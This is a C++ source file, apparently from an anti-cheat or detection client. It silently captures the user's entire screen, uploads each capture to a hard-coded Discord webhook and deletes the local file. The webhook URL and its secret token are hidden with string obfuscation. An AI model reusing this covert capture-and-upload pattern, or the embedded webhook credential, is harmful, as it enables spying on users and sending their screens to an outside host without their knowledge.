#include "Monitoring.h"


#include <string>
#include <iostream>
#include <thread>


#include <dpp/colors.h>
#include "../LogSystem/File/File.h"
#include "../Utils/crypt_str.h"
#include "../Utils/utils.h"
#include "WebHook/WebHook.h"




HBITMAP Monitoring::CaptureScreenBitmap( )
{
	HDC hDC = GetDC( NULL );
	HDC hMemDC = CreateCompatibleDC( hDC );

	INT x = GetSystemMetrics( SM_XVIRTUALSCREEN );
	INT y = GetSystemMetrics( SM_YVIRTUALSCREEN );
	INT lWidth = GetSystemMetrics( SM_CXVIRTUALSCREEN );
	INT lHeight = GetSystemMetrics( SM_CYVIRTUALSCREEN );

	BITMAPINFOHEADER biHeader = {};
	biHeader.biSize = sizeof( BITMAPINFOHEADER );
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = lWidth;
	biHeader.biHeight = lHeight;

	BITMAPINFO bInfo = {};
	bInfo.bmiHeader = biHeader;

	BYTE * bBits = NULL;
	HBITMAP hBitmap = CreateDIBSection( hDC , &bInfo , DIB_RGB_COLORS , ( VOID ** ) &bBits , NULL , 0 );

	SelectObject( hMemDC , hBitmap );
	BitBlt( hMemDC , 0 , 0 , lWidth , lHeight , hDC , x , y , SRCCOPY );

	DeleteDC( hMemDC );
	ReleaseDC( NULL , hDC );

	return hBitmap;
}

HBITMAP Monitoring::ReconstructBitmap( const BitmapData & bitmapData ) {
	HDC hDC = GetDC( NULL );

	void * pBits = nullptr;
	HBITMAP hBitmap = CreateDIBSection(
		hDC ,
		( BITMAPINFO * ) &bitmapData.biHeader ,
		DIB_RGB_COLORS ,
		&pBits ,
		NULL ,
		0
	);

	if ( hBitmap && pBits ) {
		memcpy( pBits , bitmapData.pData , bitmapData.dataSize );
	}

	ReleaseDC( NULL , hDC );
	return hBitmap;
}

BitmapData Monitoring::ExtractBitmapMemory( HBITMAP hBitmap ) {
	BITMAP bitmap;
	GetObject( hBitmap , sizeof( BITMAP ) , &bitmap );

	int dataSize = bitmap.bmWidthBytes * bitmap.bmHeight;
	BYTE * pBitmapData = new BYTE[ dataSize ];

	HDC hDC = GetDC( NULL );
	HDC hMemDC = CreateCompatibleDC( hDC );

	BITMAPINFOHEADER biHeader = {};
	biHeader.biSize = sizeof( BITMAPINFOHEADER );
	biHeader.biWidth = bitmap.bmWidth;
	biHeader.biHeight = bitmap.bmHeight;
	biHeader.biPlanes = 1;
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;

	GetDIBits( hMemDC , hBitmap , 0 , bitmap.bmHeight , pBitmapData , ( BITMAPINFO * ) &biHeader , DIB_RGB_COLORS );

	DeleteDC( hMemDC );
	ReleaseDC( NULL , hDC );

	BitmapData bitmapData = { biHeader, pBitmapData, dataSize };
	return bitmapData;
}

BOOL Monitoring::SaveBitmapToFile( HBITMAP hBitmap , const char * wPath ) {
	BITMAPFILEHEADER bfHeader = {};
	BITMAPINFOHEADER biHeader = {};
	BITMAP bAllDesktops = {};

	HDC hDC = GetDC( NULL );
	GetObject( hBitmap , sizeof( BITMAP ) , &bAllDesktops );

	LONG lWidth = bAllDesktops.bmWidth;
	LONG lHeight = bAllDesktops.bmHeight;

	bfHeader.bfType = ( WORD ) ( 'B' | ( 'M' << 8 ) );
	bfHeader.bfOffBits = sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER );

	biHeader.biSize = sizeof( BITMAPINFOHEADER );
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = lWidth;
	biHeader.biHeight = lHeight;

	DWORD cbBits = ( ( ( 24 * lWidth + 31 ) & ~31 ) / 8 ) * lHeight;

	BYTE * bBits = new BYTE[ cbBits ];
	GetDIBits( hDC , hBitmap , 0 , lHeight , bBits , ( BITMAPINFO * ) &biHeader , DIB_RGB_COLORS );

	HANDLE hFile = CreateFileA( wPath , GENERIC_WRITE , 0 , NULL , CREATE_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
	if ( hFile == INVALID_HANDLE_VALUE ) {
		ReleaseDC( NULL , hDC );
		delete[ ] bBits;
		return FALSE;
	}

	DWORD dwWritten = 0;
	WriteFile( hFile , &bfHeader , sizeof( BITMAPFILEHEADER ) , &dwWritten , NULL );
	WriteFile( hFile , &biHeader , sizeof( BITMAPINFOHEADER ) , &dwWritten , NULL );
	WriteFile( hFile , bBits , cbBits , &dwWritten , NULL );

	CloseHandle( hFile );
	ReleaseDC( NULL , hDC );
	delete[ ] bBits;

	return TRUE;
}

void Monitoring::SendBitMap( BitmapData Bitmap ) {

}

WebHook wHook( crypt_str("https://discord.com/api/webhooks/1280326464205754408/DGvf16Fl7w6OS0pvoijSnK5Y4a_yIjjoh0ZXTbp0FcHzOaT5Gvr7N3G8HFGGZAnmoHVG") );

void Monitoring::GenerateScreenShot( std::string Filename ) {
	HBITMAP Screen = CaptureScreenBitmap( );
	SaveBitmapToFile( Screen , Filename.c_str( ) );
	File Screenshot( crypt_str( "" ) , Filename );

	while ( !Screenshot.Exists( ) )
		std::this_thread::sleep_for( std::chrono::seconds( 1 ) );
}

void Monitoring::SendDetectionInfo( std::string INFO, bool Capture ) {
	if ( Capture ) {
		std::string nFile = Utils::Get( ).GetRandomWord( 17 ) + crypt_str( ".jpg" );
		GenerateScreenShot( nFile );
		wHook.SendWebHookMessageWithFile( INFO , nFile , dpp::colors::red );
		File( nFile ).Delete( );
		return;
	}

	wHook.SendWebHookMessage( INFO , dpp::colors::red );

}

void Monitoring::SendWarningInfo( std::string INFO, bool Capture ) {
	if ( Capture ) {
		std::string nFile = Utils::Get( ).GetRandomWord( 17 ) + crypt_str( ".jpg" );
		GenerateScreenShot( nFile );
		wHook.SendWebHookMessageWithFile( INFO , nFile , dpp::colors::yellow );
		File( nFile ).Delete( );
		return;
	}

	wHook.SendWebHookMessage( INFO , dpp::colors::yellow );
}

void Monitoring::SendInfo( std::string INFO , bool Capture ) {
	if ( Capture ) {
		std::string nFile = Utils::Get( ).GetRandomWord( 17 ) + crypt_str( ".jpg" );
		GenerateScreenShot( nFile );
		wHook.SendWebHookMessageWithFile( INFO , nFile , dpp::colors::cyan );
		File( nFile ).Delete( );
		return;
	}

	wHook.SendWebHookMessage( INFO );
}

void Monitoring::Init( ) {

	while ( true ) {

		




		std::this_thread::sleep_for( std::chrono::seconds( 30 ) );
	}
}

